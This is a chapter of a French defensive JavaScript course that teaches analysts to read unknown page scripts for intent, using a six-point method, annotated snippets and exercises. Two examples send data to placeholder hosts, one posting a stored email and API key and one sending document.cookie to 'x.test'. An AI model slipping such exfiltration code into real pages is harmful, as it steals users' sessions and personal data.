---
title: Chapitre 33 — Lire un script JavaScript inconnu
source: IT/07 Scripting & programmation/Langages/JavaScript.md
note: JavaScript
up:
- - JavaScript
  - ../index.md
- - 'Partie 7 — Sécurité web côté client : synthèse défensive'
  - index.md
---

## Le minimum à savoir

Compétence finale et très concrète pour un profil cyber/OSINT : **lire du JavaScript trouvé dans une page**, sans forcément tout comprendre, pour en saisir **l'intention et le comportement**. On rassemble ici l'exercice récurrent « 🔍 Lecture de code inconnu » semé tout au long du cours.

### Une méthode de lecture en 6 points

Face à un script inconnu, cherche dans l'ordre :

1. **Les variables et constantes** (`const`, `let`) : quels noms ? Des indices (`token`, `apiKey`, `user`, `url`) ?
2. **Les fonctions** (`function`, `=>`) : leurs **noms** révèlent l'intention (`sendData`, `getToken`, `validate`, `encrypt`).
3. **Les événements** (`addEventListener`) : à quelles actions le code réagit (clic, envoi de formulaire, frappe) ?
4. **Les appels réseau** (`fetch`, `XMLHttpRequest`, `axios`) : **avec quels serveurs** le code communique, **quelles données** il envoie/reçoit.
5. **Les accès au stockage** (`localStorage`, `sessionStorage`, `document.cookie`) : quelles données sont lues/écrites ? Un secret manipulé côté client ?
6. **Les points chauds de sécurité** (`innerHTML`, `eval`, `new Function`, `document.write`) : insertion de données → risque de XSS ; exécution de texte → danger.

### Exemple commenté

```javascript
// 1. Variables : une clé d'API en clair (signal !) et une URL d'API
const apiKey = "abc123";
const endpoint = "https://collecte.exemple.test/track";

// 3. Événement : réagit à l'envoi du formulaire
document.querySelector("#form").addEventListener("submit", async (e) => {
  e.preventDefault();

  // 5. Accès stockage : lit des données locales
  const email = localStorage.getItem("user_email");

  // 4. Appel réseau : ENVOIE des données à un serveur externe
  await fetch(endpoint, {
    method: "POST",
    body: JSON.stringify({ email, key: apiKey })
  });

  // 6. Point chaud : insère une donnée via innerHTML → risque XSS
  document.querySelector("#msg").innerHTML = "Merci " + email;
});
```


**Lecture en clair :** au moment de l'envoi du formulaire, ce script **lit l'email stocké localement** et l'**envoie, avec une clé d'API en clair, à un serveur externe** (`collecte.exemple.test`) ; puis il **affiche l'email via `innerHTML`** (insertion potentiellement dangereuse). Sans connaître chaque détail, tu as identifié : une exfiltration de données vers un tiers, un secret exposé côté client, et un point de XSS. C'est exactement le type d'observation utile en analyse.

## Très utile en pratique

Où trouver le JavaScript d'une page : DevTools → onglet **Sources** (ou *Débogueur*) liste tous les fichiers `.js` chargés ; onglet **Réseau** filtré sur *JS* montre ce qui est téléchargé. Du code minifié (compressé sur une ligne) peut être ré-indenté avec le bouton *Pretty print* `{ }` des DevTools pour le rendre lisible.

> ### 🛡️ Réflexe sécurité : lire n'est pas exécuter
> **Lis** le code, ne le **lance** pas à l'aveugle. Ne copie-colle jamais un script inconnu dans ta console ou dans un fichier que tu exécutes : ce serait exécuter du code que tu ne maîtrises pas (risque n° 10). L'analyse statique (lecture) est sûre ; l'exécution ne l'est pas.

## Exemple simple

```javascript
// Repère en 30 secondes : que fait ce script ?
const c = document.cookie;                    // 5. lit les cookies
fetch("https://x.test/c?d=" + encodeURIComponent(c));  // 4. les envoie ailleurs
// → exfiltration de cookies. Motif typiquement malveillant.
```


## Application IT / cyber / OSINT

C'est une compétence d'analyste **directement opérationnelle** : comprendre le comportement d'une page, repérer un script de pistage ou d'exfiltration, identifier les serveurs contactés (utile en threat intel pour extraire des IOC : domaines, endpoints), et évaluer la dangerosité d'un bout de code. Couplée à tout le cours (tu sais maintenant ce que font `fetch`, `localStorage`, `innerHTML`, les regex…), cette lecture devient rapide et précise. C'est l'un des ponts les plus directs vers le travail réel en SOC, OSINT et sécurité web.

## ❌ Erreur classique

```javascript
// ❌ Exécuter le script pour "voir ce qu'il fait"
// → JAMAIS sur du code inconnu : tu lui donnes ton contexte (cookies, session).

// ❌ Se décourager devant du code minifié
// → utilise "Pretty print" {} des DevTools pour le réindenter.

// ❌ Ignorer les chaînes de caractères
// → URLs, clés, domaines en clair sont souvent les indices les plus parlants.
```


> **Réflexe diagnostic :** code illisible d'un bloc ? Réindente-le (*Pretty print*), puis applique la méthode en 6 points. Concentre-toi sur **fetch**, **stockage** et **innerHTML/eval** : ils racontent l'essentiel du comportement.

## Exercices

**Guidé**

1. Sur une page web réelle, DevTools → Sources, ouvre un fichier `.js`.
2. Applique la méthode : repère un `addEventListener`, un `fetch`, un accès stockage.
3. Résume en deux phrases ce que fait ce bout de code.

**Autonome**
Prends le script « exemple commenté » de ce chapitre (ou un autre court script). Liste séparément : variables sensibles, serveurs contactés, données envoyées, points chauds de sécurité. Conclus sur son intention.

**Défi**
Trouve (sur tes propres pages de lab, ou un script volontairement écrit pour l'exercice) un script qui combine lecture de stockage + `fetch` externe + `innerHTML`. Rédige une mini-analyse défensive : que fait-il, quels IOC en extraire (domaines/endpoints), quels risques, et comment le réécrire proprement (`textContent`, pas de secret côté client). **Reste dans un cadre légal : analyse statique, sur des scripts que tu as le droit d'examiner.**

## ✅ Tu sais maintenant…

- appliquer une méthode de lecture en 6 points à un script inconnu ;
- repérer variables, fonctions, événements, appels réseau, accès stockage, points chauds ;
- déduire l'intention et le comportement d'un script ;
- réindenter du code minifié et localiser le JS d'une page ;
- analyser **sans exécuter**, dans un cadre légal et défensif.

-----

## ✅ CHECKPOINT 7 — Tu comprends la sécurité web côté client

Tu as terminé le parcours principal. Assure-toi de pouvoir, **sans regarder** :

- [ ] expliquer le XSS et le DOM XSS, et la défense `textContent` ;
- [ ] expliquer le rôle d'une CSP et des en-têtes de sécurité ;
- [ ] relier cookies, CORS, CSP dans l'arsenal de défenses navigateur ;
- [ ] énoncer et appliquer « le client n'est jamais de confiance » ;
- [ ] lire un script inconnu avec la méthode en 6 points ;
- [ ] relier chaque risque de la Boîte à risques à son chapitre.

Tu disposes maintenant d'un socle JavaScript **orienté défense** : comprendre le web, lire du JS, manipuler des données, scripter avec Node.js, et raisonner sécurité côté client. La suite logique est la sécurité web approfondie.


-----
